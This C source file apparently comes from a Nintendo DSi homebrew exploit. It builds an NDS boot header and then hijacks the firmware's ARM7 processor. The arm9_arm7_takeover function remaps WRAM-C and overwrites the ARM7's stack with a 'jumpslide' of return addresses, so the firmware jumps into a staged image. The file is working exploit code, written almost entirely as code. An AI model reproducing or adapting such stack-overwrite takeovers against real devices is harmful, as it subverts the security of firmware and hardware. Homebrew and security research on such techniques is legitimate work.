/*
 * src/arm9/arm7_boot.c
 *
 * ARM7 hand-off for the DSi boot-stage-2 overflow boot. See
 * include/arm9/arm7_boot.h and docs/stage2_re.md.
 *
 * Hardware side effects:
 *   - writes a 352-byte boot header to Main RAM 0x02FFFE00 (the canonical
 *     NDS boot-info address);
 *   - reads/polls IPCSYNC (0x04000180) and writes 0x600 to it.
 */
#include "arm9/arm7_boot.h"
#include "arm9/scfg.h"
#include "common/cache.h"
#include "common/dsi_hw.h"
#include "common/mem.h"
#include "common/nds_header.h"

/* Boot-info (NDS header) the ARM7 firmware reads. See stage2_re.md. */
#define ARM9_BOOTINFO_ADDR  0x02FFFE00u   /* published here               */
#define ARM9_BOOTINFO_SIZE  0x160u        /* 352 bytes the ARM7 consumes  */
#define ARM9_BOOTINFO_HDR   0x200u        /* full NDS header we build     */

/* Standard NDS header descriptor fields (@ref pack_nds.py). */
#define BOOTINFO_ARM9_ENTRY 0x02200800u
#define BOOTINFO_ARM9_RAM   0x02200000u
#define BOOTINFO_ARM7_ENTRY 0x02380000u   /* <-- our ARM7 entry           */
#define BOOTINFO_ARM7_RAM   0x02380000u

/* Nintendo logo lives at header offset 0xC0; its CRC16 at 0x15C. */
#define BOOTINFO_LOGO_OFF   0xC0u
#define BOOTINFO_LOGO_LEN   0x9Cu
#define BOOTINFO_LOGO_CRC   0x15Cu
#define BOOTINFO_HDR_CRC    0x15Eu

/* IPCSYNC handshake values (@ref 0x037B9AC4 / 0x0238091C). */
#define IPCSYNC_ARM7_READY  0x06u         /* low byte the ARM7 leaves set  */
#define IPCSYNC_ARM7_GO     0x0600u       /* tells the ARM7 to take the off*/
#define IPCSYNC_POLL_MAX    0x00200000u   /* bounded wait (~ms)           */

/* The standard Nintendo logo (@ref scripts/pack_nds.py load_logo). */
static const u8 kNintendoLogo[BOOTINFO_LOGO_LEN] = {
    0x24, 0xFF, 0xAE, 0x51, 0x69, 0x9A, 0xA2, 0x21, 0x3D, 0x84, 0x82, 0x0A,
    0x84, 0xE4, 0x09, 0xAD, 0x11, 0x24, 0x8B, 0x98, 0xC0, 0x81, 0x7F, 0x21,
    0xA3, 0x52, 0xBE, 0x19, 0x93, 0x09, 0xCE, 0x20, 0x10, 0x46, 0x4A, 0x4A,
    0xF8, 0x27, 0x31, 0xEC, 0x58, 0xC7, 0xE8, 0x33, 0x82, 0xE3, 0xCE, 0xBF,
    0x85, 0xF4, 0xDF, 0x94, 0xCE, 0x4B, 0x09, 0xC1, 0x94, 0x56, 0x8A, 0xC0,
    0x13, 0x72, 0xA7, 0xFC, 0x9F, 0x84, 0x4D, 0x73, 0xA3, 0xCA, 0x9A, 0x61,
    0x58, 0x97, 0xA3, 0x27, 0xFC, 0x03, 0x98, 0x76, 0x23, 0x1D, 0xC7, 0x61,
    0x03, 0x04, 0xAE, 0x56, 0xBF, 0x38, 0x84, 0x00, 0x40, 0xA7, 0x0E, 0xFD,
    0xFF, 0x52, 0xFE, 0x03, 0x6F, 0x95, 0x30, 0xF1, 0x97, 0xFB, 0xC0, 0x85,
    0x60, 0xD6, 0x80, 0x25, 0xA9, 0x63, 0xBE, 0x03, 0x01, 0x4E, 0x38, 0xE2,
    0xF9, 0xA2, 0x34, 0xFF, 0xBB, 0x3E, 0x03, 0x44, 0x78, 0x00, 0x90, 0xCB,
    0x88, 0x11, 0x3A, 0x94, 0x65, 0xC0, 0x7C, 0x63, 0x87, 0xF0, 0x3C, 0xAF,
    0xD6, 0x25, 0xE4, 0x8B, 0x38, 0x0A, 0xAC, 0x72, 0x21, 0xD4, 0xF8, 0x07,
};

void arm9_boot_arm7(void)
{
    u8 hdr[ARM9_BOOTINFO_HDR];
    u32 i;

    dsi_memset(hdr, 0, sizeof(hdr));

    /* ---- ARM9 / ARM7 descriptors (standard NDS header) ---- */
    dsi_write_le32(hdr + 0x20, 0u);                    /* ARM9 rom offset */
    dsi_write_le32(hdr + 0x24, BOOTINFO_ARM9_ENTRY);
    dsi_write_le32(hdr + 0x28, BOOTINFO_ARM9_RAM);
    dsi_write_le32(hdr + 0x2C, 0u);                    /* ARM9 size       */
    dsi_write_le32(hdr + 0x30, 0u);                    /* ARM7 rom offset */
    dsi_write_le32(hdr + 0x34, BOOTINFO_ARM7_ENTRY);   /* ARM7 ENTRY      */
    dsi_write_le32(hdr + 0x38, BOOTINFO_ARM7_RAM);
    dsi_write_le32(hdr + 0x3C, 0u);                    /* ARM7 size       */

    /* ---- valid logo + CRCs (little-endian u16 stores) ---- */
    dsi_memcpy(hdr + BOOTINFO_LOGO_OFF, kNintendoLogo, BOOTINFO_LOGO_LEN);
    {
        u16 logo_crc = nds_crc16(hdr + BOOTINFO_LOGO_OFF, BOOTINFO_LOGO_LEN);
        u16 hdr_crc  = nds_crc16(hdr, BOOTINFO_HDR_CRC);
        hdr[BOOTINFO_LOGO_CRC + 0u] = (u8)(logo_crc & 0xFFu);
        hdr[BOOTINFO_LOGO_CRC + 1u] = (u8)(logo_crc >> 8);
        hdr[BOOTINFO_HDR_CRC + 0u]  = (u8)(hdr_crc & 0xFFu);
        hdr[BOOTINFO_HDR_CRC + 1u]  = (u8)(hdr_crc >> 8);
    }

    /* ---- publish, then ring the ARM7 ---- */
    dsi_memcpy((void *)(uintptr_t)ARM9_BOOTINFO_ADDR, hdr, ARM9_BOOTINFO_SIZE);

    for (i = 0; i < IPCSYNC_POLL_MAX; i++) {
        if ((REG16(IPC_SYNC) & 0xFFu) == IPCSYNC_ARM7_READY) {
            break;
        }
    }
    REG16(IPC_SYNC) = IPCSYNC_ARM7_GO;
}

/*
 * @ref Astronaut `astronaut/arm9/src/arm7_exploit.rs` (Vickerinox/Astronaut,
 * GPL-3.0-or-later) — the stage-2 ARM7 takeover.
 *
 * The firmware ARM7 keeps its stack in the NWRAM-C window at 0x03800000. While
 * the ARM9 owns WRAM-C it can write that memory: we map the window at
 * 0x03800000, hand slot 4 to the ARM9 and fill the firmware's return/stack
 * window with our ARM7 entry. When the mapping is withdrawn the firmware ARM7
 * still sees the overwritten words, pops 0x02380000 on its next return and
 * starts our image. This is timing sensitive (we steal the slot the ARM7 is
 * using for a few microseconds) but it is the only route that reaches an ARM7
 * that is already past its boot path.
 *
 * Hardware side effects:
 *   - writes MBK8 (WRAM-C window) and MBK5 (slot ownership), then restores the
 *     exact stage-2 values;
 *   - writes 0x800 words of NWRAM-C at 0x03803040;
 *   - cleans/invalidates the ARM9 data cache around the remap.
 */
bool arm9_arm7_takeover(void)
{
    u32 mbk5;
    u32 mbk8;
    u32 i;

    /* Marker is written by overflow_bootstrap.s after staging the ARM7. */
    if (REG32(ARM7_HANDOFF_MARKER_ADDR) != ARM7_HANDOFF_MARKER_MAGIC) {
        return false;
    }
    REG32(ARM7_HANDOFF_MARKER_ADDR) = 0u;

    /* The staged image must start with an ARM branch (crt0's reset vector). */
    if ((REG32(ARM7_HANDOFF_ENTRY) & 0xFF000000u) != 0xEA000000u) {
        return false;
    }

    /* Clear the diagnostic markers our ARM7 will write once it is alive. */
    REG32(ARM7_READY_MARKER_ADDR) = 0u;
    REG32(ARM7_JUMP_MARKER_ADDR) = 0u;

    /* The NWRAM page is DSi-only; on a legacy DS this is a no-op. */
    if (!scfg_is_twl_mode()) {
        return false;
    }
    (void)scfg_unlock();

    mbk5 = REG32(MBK5);
    mbk8 = REG32(MBK8);

    /*
     * Map WRAM-C at 0x03800000 on the ARM9 and hand slot 4 to us. Both writes
     * must stick; if MBK9 protects WRAM-C the slide cannot be armed.
     */
    if (!scfg_set_mbk(8u, ARM7_HANDOFF_MBK8_WINDOW) ||
        !scfg_set_mbk(5u, ARM7_HANDOFF_MBK5_SLOT)) {
        REG32(MBK5) = mbk5;
        REG32(MBK8) = mbk8;
        return false;
    }

    /* The jumpslide: every return address in the window becomes our entry. */
    for (i = 0u; i < ARM7_HANDOFF_SLIDE_WORDS; i++) {
        REG32(ARM7_HANDOFF_SLIDE_ADDR + i * 4u) = ARM7_HANDOFF_ENTRY;
    }

    /*
     * The stores above are cached. Clean them out to physical WRAM before the
     * mapping is withdrawn, otherwise the ARM7 sees the old stack contents.
     */
    dc_flush_range((const void *)(uintptr_t)ARM7_HANDOFF_SLIDE_ADDR,
                   ARM7_HANDOFF_SLIDE_WORDS * 4u);

    /* Put the stage-2 mapping back exactly as we found it. */
    REG32(MBK5) = mbk5;
    REG32(MBK8) = mbk8;

    /* Drop any cache lines still tagged to the temporary ARM9 window. */
    cache_flush_all();

    return true;
}
